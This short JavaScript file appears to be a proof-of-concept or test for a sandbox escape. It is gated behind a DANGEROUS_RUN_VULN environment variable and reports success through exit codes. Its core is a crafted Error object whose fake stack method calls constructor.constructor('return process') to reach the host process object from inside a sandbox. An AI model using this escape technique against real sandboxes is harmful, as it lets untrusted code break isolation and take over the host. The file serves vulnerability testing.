if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

(function () {
	const bad = new Error();
	bad.__proto__ = null;
	bad.stack = {
		startsWith() {
			return true;
		},
		length: 5,
		match(outer) {
			process.exit(0);
			throw outer.constructor.constructor("return process")();
		},
	};
	return bad;
})();

setTimeout(() => {
	process.exit(82);
}, 1000);
